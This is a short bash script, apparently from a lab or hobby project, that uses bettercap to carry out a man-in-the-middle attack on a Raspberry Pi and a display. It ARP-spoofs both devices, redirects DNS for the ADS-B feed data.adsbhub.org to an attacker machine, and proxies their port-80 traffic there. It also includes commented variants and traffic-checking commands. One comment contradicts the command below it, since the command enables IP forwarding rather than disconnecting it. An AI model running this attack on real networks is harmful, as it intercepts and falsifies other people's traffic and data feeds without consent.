# This script is used to disconnect the Raspberry Pi and the display from the network by ARP spoofing.
#!/bin/bash
# sudo apt install bettercap

. $(dirname "$0")/config.sh

DOMAIN="data.adsbhub.org"
# Disconnect ip forwarding
sudo sysctl -w net.ipv4.ip_forward=1

sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets $PI_ADDRESS,$DISPLAY_ADDRESS; set arp.spoof.fullduplex true; set arp.spoof.internal true; arp.spoof on; set dns.spoof.domains $DOMAIN; set dns.spoof.address $HACK_LINUX_MACHINE; dns.spoof on;set any.proxy.iface $INTERFACE; set any.proxy.protocol TCP;set any.proxy.src_port 80;set any.proxy.dst_address $HACK_LINUX_MACHINE; set any.proxy.dst_port 5000;any.proxy on;"
# sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets $HACK_HOST_MACHINE; set arp.spoof.fullduplex true; set arp.spoof.internal true; arp.spoof on; set dns.spoof.domains $DOMAIN; set dns.spoof.address $HACK_LINUX_MACHINE; dns.spoof on"
# sudo bettercap -iface $INTERFACE -eval "
#   set arp.spoof.targets   $DISPLAY_ADDRESS
#   set arp.spoof.fullduplex true
#   set arp.spoof.internal  true
#   arp.spoof on

#   set dns.spoof.domains   $DOMAIN
#   set dns.spoof.address   $HACK_LINUX_MACHINE
#   dns.spoof on

#   set any.proxy.iface $INTERFACE; set any.proxy.protocol CP;set any.proxy.src_port 80;set any.proxy.dst_address $HACK_LINUX_MACHINE; set any.proxy.dst_port 5000;any.proxy on;
# "

# TEST
# curl -v http://data.adsbhub.org/
# sudo iptables  -t nat -L PREROUTING -n -v
# NOTE:
# wireshark filter: dns.qry.name contains "data.adsbhub.org"
# tshark -Y 'dns.qry.name == "data.adsbhub.org"'

 
# Check the vitim PC
# arp -a